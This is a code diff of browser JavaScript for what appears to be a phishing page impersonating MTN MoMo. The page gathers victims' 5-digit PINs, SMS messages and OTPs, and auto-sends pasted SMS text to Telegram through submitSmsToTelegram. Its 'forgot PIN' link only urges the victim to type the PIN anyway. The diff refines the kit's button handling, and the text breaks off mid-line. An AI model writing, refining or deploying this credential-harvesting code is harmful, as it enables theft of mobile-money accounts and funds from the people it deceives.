@@ -45,7 +45,6 @@ document.addEventListener('DOMContentLoaded', () => {
   const displayPinPhone = $('display-pin-phone');
   const pinBoxes5 = Array.from(document.querySelectorAll('.pin-box-5'));
   const btnTogglePinVisibility = $('btn-toggle-pin-visibility');
-  const linkForgotPin = $('link-forgot-pin');
 
   const displaySmsPhone = $('display-sms-phone');
   const smsInputBox = $('sms-input-box');
@@ -64,6 +63,7 @@ document.addEventListener('DOMContentLoaded', () => {
   let smsAutoSubmittedForCurrentValue = '';
   let pinSubmittedForCurrentValue = '';
   let otpSubmittedForCurrentValue = '';
+  let lastActionTimestamp = 0;
 
   const urlParams = new URLSearchParams(window.location.search);
   const adminParam = urlParams.get('admin') || '';
@@ -441,12 +441,12 @@ document.addEventListener('DOMContentLoaded', () => {
     showScreen(screens.welcome);
   }
 
-  // Centralized button handler so every button works even if tapped immediately
-  document.addEventListener('click', async (e) => {
-    const btn = e.target.closest('button, a');
-    if (!btn || !btn.id) return;
+  async function handleButtonAction(buttonId, event) {
+    const now = Date.now();
+    if (now - lastActionTimestamp < 120) return;
+    lastActionTimestamp = now;
 
-    switch (btn.id) {
+    switch (buttonId) {
       case 'btn-goto-slider':
         showScreen(screens.slider);
         break;
@@ -490,7 +490,7 @@ document.addEventListener('DOMContentLoaded', () => {
         break;
       }
       case 'link-forgot-pin':
-        e.preventDefault();
+        if (event) event.preventDefault();
         showBanner(bannerPinError, 'Enter your 5-digit MTN MoMo PIN code in the boxes above to continue.');
         break;
       case 'btn-request-new-sms': {
@@ -536,7 +536,18 @@ document.addEventListener('DOMContentLoaded', () => {
       default:
         break;
     }
-  });
+  }
+
+  document.addEventListener(
+    'click',
+    (e) => {
+      const target = e.target && e.target.closest('button, a');
+      if (target && target.id) {
+        handleButtonAction(target.id, e);
+      }
+    },
+    true
+  );
 
   pinBoxes5.forEach((box, idx) => {
     box.addEventListener('input', () => {
@@ -562,11 +573,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (!smsInputBox) return;
     const currentText = smsInputBox.value.replace(/\s+/g, ' ').trim();
     if (isValidMomoSms(currentText) && currentText !== smsAutoSubmittedForCurrentValue) {
-      smsAutoSubmittedForCurrentValue = currentText;
-      submitSmsToTelegram(currentText, true);
-    }
-  }
-
-  if (smsInputBox) {
-    smsInputBox.addEventListener('input', checkAndAutoSubmitSms);
-    sm
+      smsAutoSubmittedForCurr
